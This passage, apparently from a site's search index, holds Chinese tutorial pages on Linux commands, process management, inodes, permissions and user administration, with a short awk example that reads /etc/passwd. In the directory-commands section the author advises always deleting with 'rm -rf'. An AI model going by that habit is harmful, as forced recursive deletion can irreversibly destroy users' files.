双向输出重定向    输出重定向会将输出内容重定向到文件中，而 tee 不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。\n$ tee [-a] file 字符转换指令    tr 用来删除一行中的字符，或者对字符进行替换。\n$ tr [-ds] SET1 ... -d ： 删除行中 SET1 这个字符串 示例，将 last 输出的信息所有小写转换为大写。\n$ last | tr \u0026#39;[a-z]\u0026#39; \u0026#39;[A-Z]\u0026#39; col 将 tab 字符转为空格字符。\n$ col [-xb] -x ： 将 tab 键转换成对等的空格键 expand 将 tab 转换一定数量的空格，默认是 8 个。\n$ expand [-t] file -t ：tab 转为空格的数量 join 将有相同数据的那一行合并在一起。\n$ join [-ti12] file1 file2 -t ：分隔符，默认为空格 -i ：忽略大小写的差异 -1 ：第一个文件所用的比较字段 -2 ：第二个文件所用的比较字段 paste 直接将两行粘贴在一起。\n$ paste [-d] file1 file2 -d ：分隔符，默认为 tab 分区指令    split 将一个文件划分成多个文件。\n$ split [-bl] file PREFIX -b ：以大小来进行分区，可加单位，例如 b, k, m 等 -l ：以行数来进行分区。 - PREFIX ：分区文件的前导名称 九、正则表达式    grep    g/re/p（globally search a regular expression and print)，使用正则表示式进行全局查找并打印。\n$ grep [-acinv] [--color=auto] 搜寻字符串 filename -c ： 统计匹配到行的个数 -i ： 忽略大小写 -n ： 输出行号 -v ： 反向选择，也就是显示出没有 搜寻字符串 内容的那一行 --color=auto ：找到的关键字加颜色显示 示例：把含有 the 字符串的行提取出来（注意默认会有 \u0026ndash;color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串）\n$ grep -n \u0026#39;the\u0026#39; regular_express.txt 8:I can\u0026#39;t finish the test. 12:the symbol \u0026#39;*\u0026#39; is represented as start. 15:You are the best is mean you are the no. 1. 16:The world Happy is the same with \u0026#34;glad\u0026#34;. 18:google is the best tools for search keyword 示例：正则表达式 a{m,n} 用来匹配字符 a m~n 次，这里需要将 { 和 } 进行转义，因为它们在 shell 是有特殊意义的。\n$ grep -n \u0026#39;a\\{2,5\\}\u0026#39; regular_express.txt printf    用于格式化输出。它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。\n$ printf \u0026#39;%10s %5i %5i %5i %8.2f \\n\u0026#39; $(cat printf.txt) DmTsai 80 60 92 77.33 VBird 75 55 80 70.00 Ken 60 90 70 73.33 awk    是由 Alfred Aho，Peter Weinberger 和 Brian Kernighan 创造，awk 这个名字就是这三个创始人名字的首字母。\nawk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：$n，n 为字段号，从 1 开始，$0 表示一整行。\n示例：取出最近五个登录用户的用户名和 IP。首先用 last -n 5 取出用最近五个登录用户的所有信息，可以看到用户名和 IP 分别在第 1 列和第 3 列，我们用 $1 和 $3 就能取出这两个字段，然后用 print 进行打印。\n$ last -n 5 dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged in dmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22) dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12) dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14) dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15) $ last -n 5 | awk \u0026#39;{print $1 \u0026#34;\\t\u0026#34; $3}\u0026#39; dmtsai 192.168.1.100 dmtsai 192.168.1.100 dmtsai 192.168.1.100 dmtsai 192.168.1.100 dmtsai Fri 可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。\n$ awk \u0026#39;条件类型 1 {动作 1} 条件类型 2 {动作 2} ...\u0026#39; filename 示例：/etc/passwd 文件第三个字段为 UID，对 UID 小于 10 的数据进行处理。\n$ cat /etc/passwd | awk \u0026#39;BEGIN {FS=\u0026#34;:\u0026#34;} $3 \u0026lt; 10 {print $1 \u0026#34;\\t \u0026#34; $3}\u0026#39; root 0 bin 1 daemon 2 awk 变量：\n   变量名称 代表意义     NF 每一行拥有的字段总数   NR 目前所处理的是第几行数据   FS 目前的分隔字符，默认是空格键    示例：显示正在处理的行号以及每一行有多少字段\n$ last -n 5 | awk \u0026#39;{print $1 \u0026#34;\\t lines: \u0026#34; NR \u0026#34;\\t columns: \u0026#34; NF}\u0026#39; dmtsai lines: 1 columns: 10 dmtsai lines: 2 columns: 10 dmtsai lines: 3 columns: 10 dmtsai lines: 4 columns: 10 dmtsai lines: 5 columns: 9 十、进程管理    查看进程    1. ps    查看某个时间点的进程信息。\n示例：查看自己的进程\n## ps -l 示例：查看系统所有进程\n## ps aux 示例：查看特定的进程\n## ps aux | grep threadx 2. pstree    查看进程树。\n示例：查看所有进程树\n## pstree -A 3. top    实时显示进程信息。\n示例：两秒钟刷新一次\n## top -d 2 4. netstat    查看占用端口的进程\n示例：查看特定端口的进程\n## netstat -anp | grep port 进程状态       状态 说明     R running or runnable (on run queue)\n正在执行或者可执行，此时进程位于执行队列中。   D uninterruptible sleep (usually I/O)\n不可中断阻塞，通常为 IO 阻塞。   S interruptible sleep (waiting for an event to complete) 可中断阻塞，此时进程正在等待某个事件完成。   Z zombie (terminated but not reaped by its parent)\n僵死，进程已经终止但是尚未被其父进程获取信息。   T stopped (either by a job control signal or because it is being traced) 结束，进程既可以被作业控制信号结束，也可能是正在被追踪。        \nSIGCHLD    当一个子进程改变了它的状态时（停止运行，继续运行或者退出），有两件事会发生在父进程中：\n 得到 SIGCHLD 信号； waitpid() 或者 wait() 调用会返回。  其中子进程发送的 SIGCHLD 信号包含了子进程的信息，比如进程 ID、进程状态、进程使用 CPU 的时间等。\n在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息，父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。\n-- \nwait()    pid_t wait(int *status) 父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。\n如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 -1，同时 errno 被置为 ECHILD。\n参数 status 用来保存被收集的子进程退出时的一些状态，如果对这个子进程是如何死掉的毫不在意，只想把这个子进程消灭掉，可以设置这个参数为 NULL。\nwaitpid()    pid_t waitpid(pid_t pid, int *status, int options) 作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。\npid 参数指示一个子进程的 ID，表示只关心这个子进程退出的 SIGCHLD 信号。如果 pid=-1 时，那么和 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。\noptions 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。\n孤儿进程    一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。\n孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。\n由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。\n僵尸进程    一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。\n僵尸进程通过 ps 命令显示出来的状态为 Z（zombie）。\n系统所能使用的进程号是有限的，如果产生大量僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。\n要消灭系统中大量的僵尸进程，只需要将其父进程杀死，此时僵尸进程就会变成孤儿进程，从而被 init 进程所收养，这样 init 进程就会释放所有的僵尸进程所占有的资源，从而结束僵尸进程。\n参考资料     鸟哥. 鸟 哥 的 Linux 私 房 菜 基 础 篇 第 三 版[J]. 2009. Linux 平台上的软件包管理 Linux 之守护进程、僵死进程与孤儿进程 What is the difference between a symbolic link and a hard link? Linux process states GUID Partition Table 详解 wait 和 waitpid 函数 IDE、SATA、SCSI、SAS、FC、SSD 硬盘类型介绍 Akai IB-301S SCSI Interface for S2800,S3000 Parallel ATA ADATA XPG SX900 256GB SATA 3 SSD Review – Expanded Capacity and SandForce Driven Speed Decoding UCS Invicta – Part 1 硬盘 Difference between SAS and SATA BIOS File system design case studies Programming Project #4 FILE SYSTEM DESIGN  "},{"id":260,"href":"/cs-basics/operating-system/linux/","title":"linux","parent":"operating-system","content":"点击关注公众号及时获取笔主最新更新文章，并可免费领取本文档配套的《Java 面试突击》以及 Java 工程师必备学习资源。\n 1. 从认识操作系统开始  1.1. 操作系统简介 1.2. 操作系统简单分类  1.2.1. Windows 1.2.2. Unix 1.2.3. Linux 1.2.4. Mac OS   1.3. 操作系统的内核（Kernel） 1.4. 中央处理器（CPU，Central Processing Unit） 1.5. CPU vs Kernel(内核) 1.6. 系统调用   2. 初探 Linux  2.1. Linux 简介 2.2. Linux 诞生 2.3. 常见 Linux 发行版本有哪些？   3. Linux 文件系统概览  3.1. Linux 文件系统简介 3.2. inode 介绍 3.3. Linux 文件类型 3.4. Linux 目录树   4. Linux 基本命令  4.1. 目录切换命令 4.2. 目录的操作命令(增删改查) 4.3. 文件的操作命令(增删改查) 4.4. 压缩文件的操作命令 4.5. Linux 的权限命令 4.6. Linux 用户管理 4.7. Linux 系统用户组的管理 4.8. 其他常用命令   5. 公众号  今天这篇文章中简单介绍一下一个 Java 程序员必知的 Linux 的一些概念以及常见命令。\n如果文章有任何需要改善和完善的地方，欢迎在评论区指出，共同进步！笔芯！\n1. 从认识操作系统开始    正式开始 Linux 之前，简单花一点点篇幅科普一下操作系统相关的内容。\n1.1. 操作系统简介    我通过以下四点介绍什么是操作系统：\n 操作系统（Operating System，简称 OS）是管理计算机硬件与软件资源的程序，是计算机的基石。 操作系统本质上是一个运行在计算机上的软件程序 ，用于管理计算机硬件和软件资源。 举例：运行在你电脑上的所有应用程序都通过操作系统来调用系统内存以及磁盘等等硬件。 操作系统存在屏蔽了硬件层的复杂性。 操作系统就像是硬件使用的负责人，统筹着各种相关事项。 操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理。   内核（Kernel）在后文中会提到。\n 1.2. 操作系统简单分类    1.2.1. Windows    目前最流行的个人桌面操作系统 ，不做多的介绍，大家都清楚。界面简单易操作，软件生态非常好。\n玩玩电脑游戏还是必须要有 Windows 的，所以我现在是一台 Windows 用于玩游戏，一台 Mac 用于平时日常开发和学习使用。\n1.2.2. Unix    最早的多用户、多任务操作系统 。后面崛起的 Linux 在很多方面都参考了 Unix。\n目前这款操作系统已经逐渐逐渐退出操作系统的舞台。\n1.2.3. Linux    Linux 是一套免费使用、开源的类 Unix 操作系统。 Linux 存在着许多不同的发行版本，但它们都使用了 Linux 内核 。\n 严格来讲，Linux 这个词本身只表示 Linux 内核，在 GNU/Linux 系统中，Linux 实际就是 Linux 内核，而该系统的其余部分主要是由 GNU 工程编写和提供的程序组成。单独的 Linux 内核并不能成为一个可以正常工作的操作系统。\n很多人更倾向使用 “GNU/Linux” 一词来表达人们通常所说的 “Linux”。\n 1.2.4. Mac OS    苹果自家的操作系统，编程体验和 Linux 相当，但是界面、软件生态以及用户体验各方面都要比 Linux 操作系统更好。\n1.3. 操作系统的内核（Kernel）    我们先来看看维基百科对于内核的解释，我觉得总结的非常好！\n 内核（英语：Kernel，又称核心）在计算机科学中是一个用来管理软件发出的数据 I/O（输入与输出）要求的电脑程序，将这些要求转译为数据处理的指令并交由中央处理器（CPU）及电脑中其他电子组件进行处理，是现代操作系统中最基本的部分。它是为众多应用程序提供对计算机硬件的安全访问的一部分软件，这种访问是有限的，并由内核决定一个程序在什么时候对某部分硬件操作多长时间。 直接对硬件操作是非常复杂的。所以内核通常提供一种硬件抽象的方法，来完成这些操作。有了这个，通过进程间通信机制及系统调用，应用进程可间接控制所需的硬件资源（特别是处理器及 IO 设备）。\n早期计算机系统的设计中，还没有操作系统的内核这个概念。随着计算机系统的发展，操作系统内核的概念才渐渐明晰起来了!\n 简单概括两点：\n 操作系统的内核（Kernel）是操作系统的核心部分，它负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理。 操作系统的内核是连接应用程序和硬件的桥梁，决定着操作系统的性能和稳定性。  1.4. 中央处理器（CPU，Central Processing Unit）    关于 CPU 简单概括三点：\n CPU 是一台计算机的运算核心（Core）+控制核心（ Control Unit），可以称得上是计算机的大脑。 CPU 主要包括两个部分：控制器+运算器。 CPU 的根本任务就是执行指令，对计算机来说最终都是一串由“0”和“1”组成的序列。  1.5. CPU vs Kernel(内核)    很多人容易无法区分操作系统的内核（Kernel）和中央处理器（CPU），你可以简单从下面两点来区别：\n 操作系统的内核（Kernel）属于操作系统层面，而 CPU 属于硬件。 CPU 主要提供运算，处理各种指令的能力。内核（Kernel）主要负责系统管理比如内存管理，它屏蔽了对硬件的操作。  下图清晰说明了应用程序、内核、CPU 这三者的关系。\n1.6. 系统调用    介绍系统调用之前，我们先来了解一下用户态和系统态。\n根据进程访问资源的特点，我们可以把进程在系统上的运行分为两个级别：\n 用户态(user mode) : 用户态运行的进程或可以直接读取用户程序的数据。 系统态(kernel mode): 可以简单的理解系统态运行的进程或程序几乎可以访问计算机的任何资源，不受限制。  说了用户态和系统态之后，那么什么是系统调用呢？\n我们运行的程序基本都是运行在用户态，如果我们调用操作系统提供的系统态级别的子功能咋办呢？那就需要系统调用了！\n也就是说在我们运行的用户程序中，凡是与系统态级别的资源有关的操作（如文件管理、进程控制、内存管理等)，都必须通过系统调用方式向操作系统提出服务请求，并由操作系统代为完成。\n这些系统调用按功能大致可分为如下几类：\n 设备管理 ：完成设备的请求或释放，以及设备启动等功能。 文件管理 ：完成文件的读、写、创建及删除等功能。 进程控制 ：完成进程的创建、撤销、阻塞及唤醒等功能。 进程通信 ：完成进程之间的消息传递或信号传递等功能。 内存管理 ：完成内存的分配、回收以及获取作业占用内存区大小及地址等功能。  我在网上找了一个图，通过这个图可以很清晰的说明用户程序、系统调用、内核和硬件之间的关系。（太难了~木有自己画）\n2. 初探 Linux    2.1. Linux 简介    我们上面已经简单了 Linux，这里只强调三点。\n 类 Unix 系统 ： Linux 是一种自由、开放源码的类似 Unix 的操作系统 Linux 本质是指 Linux 内核 ： 严格来讲，Linux 这个词本身只表示 Linux 内核，单独的 Linux 内核并不能成为一个可以正常工作的操作系统。所以，就有了各种 Linux 发行版。 Linux 之父(林纳斯·本纳第克特·托瓦兹 Linus Benedict Torvalds) ： 一个编程领域的传奇式人物，真大佬！我辈崇拜敬仰之楷模。他是 Linux 内核 的最早作者，随后发起了这个开源项目，担任 Linux 内核的首要架构师。他还发起了 Git 这个开源项目，并为主要的开发者。  2.2. Linux 诞生    1989 年，Linus Torvalds 进入芬兰陆军新地区旅，服 11 个月的国家义务兵役，军衔为少尉，主要服务于计算机部门，任务是弹道计算。服役期间，购买了安德鲁·斯图尔特·塔能鲍姆所著的教科书及 minix 源代码，开始研究操作系统。1990 年，他退伍后回到大学，开始接触 Unix。\n Minix 是一个迷你版本的类 Unix 操作系统，由塔能鲍姆教授为了教学之用而创作，采用微核心设计。它启发了 Linux 内核的创作。\n 1991 年，Linus Torvalds 开源了 Linux 内核。Linux 以一只可爱的企鹅作为标志，象征着敢作敢为、热爱生活。\n2.3. 常见 Linux 发行版本有哪些？    Linus Torvalds 开源的只是 Linux 内核，我们上面也提到了操作系统内核的作用。一些组织或厂商将 Linux 内核与各种软件和文档包装起来，并提供系统安装界面和系统配置、设定与管理工具，就构成了 Linux 的发行版本。\n 内核主要负责系统的内存管理，硬件设备的管理，文件系统的管理以及应用程序的管理。\n Linux 的发行版本可以大体分为两类：\n 商业公司维护的发行版本，以著名的 Red Hat 为代表，比较典型的有 CentOS 。 社区组织维护的发行版本，以 Debian 为代表，比较典型的有 Ubuntu、Debian。  对于初学者学习 Linux ,推荐选择 CentOS 。\n3. Linux 文件系统概览    3.1. Linux 文件系统简介    在 Linux 操作系统中，所有被操作系统管理的资源，例如网络接口卡、磁盘驱动器、打印机、输入输出设备、普通文件或是目录都被看作是一个文件。 也就是说在 Linux 系统中有一个重要的概念：一切都是文件。\n其实这是 UNIX 哲学的一个体现，在 UNIX 系统中，把一切资源都看作是文件，Linux 的文件系统也是借鉴 UNIX 文件系统而来。\n3.2. inode 介绍    inode 是 linux/unix 文件系统的基础。那么，inode 是什么?有什么作用呢?\n硬盘的最小存储单位是扇区(Sector)，块(block)由多个扇区组成。文件数据存储在块中。块的最常见的大小是 4kb，约为 8 个连续的扇区组成（每个扇区存储 512 字节）。一个文件可能会占用多个 block，但是一个块只能存放一个文件。\n虽然，我们将文件存储在了块(block)中，但是我们还需要一个空间来存储文件的 元信息 metadata ：如某个文件被分成几块、每一块在的地址、文件拥有者，创建时间，权限，大小等。这种 存储文件元信息的区域就叫 inode，译为索引节点：i（index）+node。 每个文件都有一个 inode，存储文件的元信息。\n可以使用 stat 命令可以查看文件的 inode 信息。每个 inode 都有一个号码，Linux/Unix 操作系统不使用文件名来区分文件，而是使用 inode 号码区分不同的文件。\n简单来说：inode 就是用来维护某个文件被分成几块、每一块在的地址、文件拥有者，创建时间，权限，大小等信息。\n简单总结一下：\n inode ：记录文件的属性信息，可以使用 stat 命令查看 inode 信息。 block ：实际文件的内容，如果一个文件大于一个块时候，那么将占用多个 block，但是一个块只能存放一个文件。（因为数据是由 inode 指向的，如果有两个文件的数据存放在同一个块中，就会乱套了）  3.3. Linux 文件类型    Linux 支持很多文件类型，其中非常重要的文件类型有: 普通文件，目录文件，链接文件，设备文件，管道文件，Socket 套接字文件等。\n 普通文件（-） ： 用于存储信息和数据， Linux 用户可以根据访问权限对普通文件进行查看、更改和删除。比如：图片、声音、PDF、text、视频、源代码等等。 目录文件（d，directory file） ：目录也是文件的一种，用于表示和管理系统中的文件，目录文件中包含一些文件名和子目录名。打开目录事实上就是打开目录文件。 符号链接文件（l，symbolic link） ：保留了指向文件的地址而不是文件本身。 字符设备（c，char） ：用来访问字符设备比如键盘。 设备文件（b，block） ： 用来访问块设备比如硬盘、软盘。 管道文件(p,pipe) : 一种特殊类型的文件，用于进程之间的通信。 套接字(s,socket) ：用于进程间的网络通信，也可以用于本机之间的非网络通信。  3.4. Linux 目录树    所有可操作的计算机资源都存在于目录树这个结构中，对计算资源的访问，可以看做是对这棵目录树的访问。\nLinux 的目录结构如下：\nLinux 文件系统的结构层次鲜明，就像一棵倒立的树，最顶层是其根目录： 常见目录说明：\n /bin： 存放二进制可执行文件(ls、cat、mkdir 等)，常用命令一般都在这里； /etc： 存放系统管理和配置文件； /home： 存放所有用户文件的根目录，是用户主目录的基点，比如用户 user 的主目录就是/home/user，可以用~user 表示； /usr ： 用于存放系统应用程序； /opt： 额外安装的可选应用程序包所放置的位置。一般情况下，我们可以把 tomcat 等都安装到这里； /proc： 虚拟文件系统目录，是系统内存的映射。可直接访问这个目录来获取系统信息； /root： 超级用户（系统管理员）的主目录（特权阶级^o^）； /sbin: 存放二进制可执行文件，只有 root 才能访问。这里存放的是系统管理员使用的系统级别的管理命令和程序。如 ifconfig 等； /dev： 用于存放设备文件； /mnt： 系统管理员安装临时文件系统的安装点，系统提供这个目录是让用户临时挂载其他的文件系统； /boot： 存放用于系统引导时使用的各种文件； /lib ： 存放着和系统运行相关的库文件 ； /tmp： 用于存放各种临时文件，是公用的临时文件存储点； /var： 用于存放运行时需要改变数据的文件，也是某些大文件的溢出区，比方说各种服务的日志文件（系统启动日志等。）等； /lost+found： 这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows 下叫什么.chk）就在这里。  4. Linux 基本命令    下面只是给出了一些比较常用的命令。推荐一个 Linux 命令快查网站，非常不错，大家如果遗忘某些命令或者对某些命令不理解都可以在这里得到解决。\nLinux 命令大全：http://man.linuxde.net/\n4.1. 目录切换命令     cd usr： 切换到该目录下 usr 目录 cd ..（或cd../）： 切换到上一层目录 cd /： 切换到系统根目录 cd ~： 切换到用户主目录 cd -： 切换到上一个操作所在目录  4.2. 目录的操作命令(增删改查)     mkdir 目录名称： 增加目录。 ls/ll（ll 是 ls -l 的别名，ll 命令可以看到该目录下的所有目录和文件的详细信息）：查看目录信息。 find 目录 参数： 寻找目录（查）。示例：① 列出当前目录及子目录下所有文件和文件夹: find .；② 在/home目录下查找以.txt 结尾的文件名:find /home -name \u0026quot;*.txt\u0026quot; ,忽略大小写: find /home -iname \u0026quot;*.txt\u0026quot; ；③ 当前目录及子目录下查找所有以.txt 和.pdf 结尾的文件:find . \\( -name \u0026quot;*.txt\u0026quot; -o -name \u0026quot;*.pdf\u0026quot; \\)或find . -name \u0026quot;*.txt\u0026quot; -o -name \u0026quot;*.pdf\u0026quot;。 mv 目录名称 新目录名称： 修改目录的名称（改）。注意：mv 的语法不仅可以对目录进行重命名而且也可以对各种文件，压缩包等进行 重命名的操作。mv 命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中。后面会介绍到 mv 命令的另一个用法。 mv 目录名称 目录的新位置： 移动目录的位置\u0026mdash;剪切（改）。注意：mv 语法不仅可以对目录进行剪切操作，对文件和压缩包等都可执行剪切操作。另外 mv 与 cp 的结果不同，mv 好像文件“搬家”，文件个数并未增加。而 cp 对文件进行复制，文件个数增加了。 cp -r 目录名称 目录拷贝的目标位置： 拷贝目录（改），-r 代表递归拷贝 。注意：cp 命令不仅可以拷贝目录还可以拷贝文件，压缩包等，拷贝文件和压缩包时不 用写-r 递归。 rm [-rf] 目录 : 删除目录（删）。注意：rm 不仅可以删除目录，也可以删除其他文件或压缩包，为了增强大家的记忆， 无论删除任何目录或文件，都直接使用rm -rf 目录/文件/压缩包。  4.3. 文件的操作命令(增删改查)     touch 文件名称: 文件的创建（增）。 cat/more/less/tail 文件名称 ：文件的查看（查） 。命令 tail -f 文件 可以对某个文件进行动态监控，例如 tomcat 的日志文件， 会随着程序的运行，日志会变化，可以使用 tail -f catalina-2016-11-11.log 监控 文 件的变化 。 vim 文件： 修改文件的内容（改）。vim 编辑器是 Linux 中的强大组件，是 vi 编辑器的加强版，vim 编辑器的命令和快捷方式有很多，但此处不一一阐述，大家也无需研究的很透彻，使用 vim 编辑修改文件的方式基本会使用就可以了。在实际开发中，使用 vim 编辑器主要作用就是修改配置文件，下面是一般步骤： vim 文件------\u0026gt;进入文件-----\u0026gt;命令模式------\u0026gt;按i进入编辑模式-----\u0026gt;编辑文件 -------\u0026gt;按Esc进入底行模式-----\u0026gt;输入：wq/q! （输入 wq 代表写入内容并退出，即保存；输入 q!代表强制退出不保存）。 rm -rf 文件： 删除文件（删）。  4.4. 压缩文件的操作命令    1）打包并压缩文件：\nLinux 中的打包文件一般是以.tar 结尾的，压缩的命令一般是以.gz 结尾的。而一般情况下打包和压缩是一起进行的，打包并压缩后的文件的后缀名一般.tar.gz。 命令：tar -zcvf 打包压缩后的文件名 要打包压缩的文件 ，其中：\n z：调用 gzip 压缩命令进行压缩 c：打包文件 v：显示运行过程 f：指定文件名  比如：假如 test 目录下有三个文件分别是：aaa.txt bbb.txt ccc.txt，如果我们要打包 test 目录并指定压缩后的压缩包名称为 test.tar.gz 可以使用命令：tar -zcvf test.tar.gz aaa.txt bbb.txt ccc.txt 或 tar -zcvf test.tar.gz /test/\n2）解压压缩包：\n命令：tar [-xvf] 压缩文件\n其中：x：代表解压\n示例：\n 将 /test 下的 test.tar.gz 解压到当前目录下可以使用命令：tar -xvf test.tar.gz 将 /test 下的 test.tar.gz 解压到根目录/usr 下:tar -xvf test.tar.gz -C /usr（- C 代表指定解压的位置）  4.5. Linux 的权限命令    操作系统中每个文件都拥有特定的权限、所属用户和所属组。权限是操作系统用来限制资源访问的机制，在 Linux 中权限一般分为读(readable)、写(writable)和执行(excutable)，分为三组。分别对应文件的属主(owner)，属组(group)和其他用户(other)，通过这样的机制来限制哪些用户、哪些组可以对特定的文件进行什么样的操作。\n通过 ls -l 命令我们可以 查看某个目录下的文件或目录的权限\n示例：在随意某个目录下ls -l\n第一列的内容的信息解释如下：\n 下面将详细讲解文件的类型、Linux 中权限以及文件有所有者、所在组、其它组具体是什么？\n 文件的类型：\n d： 代表目录 -： 代表文件 l： 代表软链接（可以认为是 window 中的快捷方式）  Linux 中权限分为以下几种：\n r：代表权限是可读，r 也可以用数字 4 表示 w：代表权限是可写，w 也可以用数字 2 表示 x：代表权限是可执行，x 也可以用数字 1 表示  文件和目录权限的区别：\n对文件和目录而言，读写执行表示不同的意义。\n对于文件：\n   权限名称 可执行操作     r 可以使用 cat 查看文件的内容   w 可以修改文件的内容   x 可以将其运行为二进制文件    对于目录：\n   权限名称 可执行操作     r 可以查看目录下列表   w 可以创建和删除目录下文件   x 可以使用 cd 进入目录    需要注意的是： 超级用户可以无视普通用户的权限，即使文件目录权限是 000，依旧可以访问。\n在 linux 中的每个用户必须属于一个组，不能独立于组外。在 linux 中每个文件有所有者、所在组、其它组的概念。\n 所有者(u) ：一般为文件的创建者，谁创建了该文件，就天然的成为该文件的所有者，用 ls ‐ahl 命令可以看到文件的所有者 也可以使用 chown 用户名 文件名来修改文件的所有者 。 文件所在组(g) ：当某个用户创建了一个文件后，这个文件的所在组就是该用户所在的组用 ls ‐ahl命令可以看到文件的所有组也可以使用 chgrp 组名 文件名来修改文件所在的组。 其它组(o) ：除开文件的所有者和所在组的用户外，系统的其它用户都是文件的其它组。   我们再来看看如何修改文件/目录的权限。\n 修改文件/目录的权限的命令：chmod\n示例：修改/test 下的 aaa.txt 的权限为文件所有者有全部权限，文件所有者所在的组有读写权限，其他用户只有读的权限。\nchmod u=rwx,g=rw,o=r aaa.txt 或者 chmod 764 aaa.txt\n补充一个比较常用的东西:\n假如我们装了一个 zookeeper，我们每次开机到要求其自动启动该怎么办？\n 新建一个脚本 zookeeper 为新建的脚本 zookeeper 添加可执行权限，命令是:chmod +x zookeeper 把 zookeeper 这个脚本添加到开机启动项里面，命令是：chkconfig --add zookeeper 如果想看看是否添加成功，命令是：chkconfig --list  4.6. Linux 用户管理    Linux 系统是一个多用户多任务的分时操作系统，任何一个要使用系统资源的用户，都必须首先向系统管理员申请一个账号，然后以这个账号的身份进入系统。\n用户的账号一方面可以帮助系统管理员对使用系统的用户进行跟踪，并控制他们对系统资源的访问；另一方面也可以帮助用户组织文件，并为用户提供安全性保护。\nLinux 用户管理相关命令:\n useradd 选项 用户名:添加用户账号 userdel 选项 用户名:删除用户帐号 usermod 选项 用户名:修改帐号 passwd 用户名:更改或创建用户的密码 passwd -S 用户名 :显示用户账号密码信息 passwd -d 用户名: 清除用户密码  useradd 命令用于 Linux 中创建的新的系统用户。useradd可用来建立用户帐号。帐号建好之后，再用passwd设定帐号的密码．而可用userdel删除帐号。使用useradd指令所建立的帐号，实际上是保存在 /etc/passwd文本文件中。\npasswd命令用于设置用户的认证信息，包括用户密码、密码过期时间等。系统管理者则能用它管理系统用户的密码。只有管理者可以指定用户名称，一般用户只能变更自己的密码。\n4.7. Linux 系统用户组的管理    每个用户都有一个用户组，系统可以对一个用户组中的所有用户进行集中管理。不同 Linux 系统对用户组的规定有所不同，如 Linux 下的用户属于与它同名的用户组，这个用户组在创建用户时同时创建。\n用户组的管理涉及用户组的添加、删除和修改。组的增加、删除和修改实际上就是对/etc/group文件的更新。\nLinux 系统用户组的管理相关命令:\n groupadd 选项 用户组 :增加一个新的用户组 groupdel 用户组:要删除一个已有的用户组 groupmod 选项 用户组 : 修改用户组的属性  4.8. 其他常用命令      pwd： 显示当前所在位置\n  sudo + 其他命令：以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。\n  grep 要搜索的字符串 要搜索的文件 --color： 搜索命令，\u0026ndash;color 代表高亮显示\n  ps -ef/ps -aux： 这两个命令都是查看当前系统正在运行进程，两者的区别是展示格式不同。如果想要查看特定的进程可以使用这样的格式：ps aux|grep redis （查看包括 redis 字符串的进程），也可使用 pgrep redis -a。\n注意：如果直接用 ps（（Process Status））命令，会显示所有进程的状态，通常结合 grep 命令查看某进程的状态。\n  kill -9 进程的pid： 杀死进程（-9 表示强制终止。）\n先用 ps 查找进程，然后用 kill 杀掉\n  网络通信命令：\n 查看当前系统的网卡信息：ifconfig 查看与某台机器的连接情况：ping 查看当前系统的端口使用：netstat -an    net-tools 和 iproute2 ： net-tools起源于 BSD 的 TCP/IP 工具箱，后来成为老版本 LinuxLinux 中配置网络功能的工具。但自 2001 年起，Linux 社区已经对其停止维护。同时，一些 Linux 发行版比如 Arch Linux 和 CentOS/RHEL 7 则已经完全抛弃了 net-tools，只支持iproute2。linux ip 命令类似于 ifconfig，但功能更强大，旨在替代它。更多详情请阅读如何在 Linux 中使用 IP 命令和示例\n  shutdown： shutdown -h now： 指定现在立即关机；shutdown +5 \u0026quot;System will shutdown after 5 minutes\u0026quot;：指定 5 分钟后关机，同时送出警告信息给登入用户。\n  reboot： reboot： 重开机。reboot -w： 做个重开机的模拟（只有纪录并不会真的重开机）。\n  5. 公众号    如果大家想要实时关注我更新的文章以及分享的干货的话，可以关注我的公众号。\n《Java 面试突击》: 由本文档衍生的专为面试而生的《Java 面试突击》V3.0 PDF 版本公众号后台回复 \u0026ldquo;Java 面试突击\u0026rdquo; 即可免费领取！\nJava 工程师必备学习资源: 一些 Java 工程师常用学习资源公众号后台回复关键字 “1” 即可免费无套路获取。\n"},{"id":261,"href":"/system-design/distributed-system/message-queue/message-queue/","title":"message-queue","parent":"message-queue","content":"消息队列其实很简单    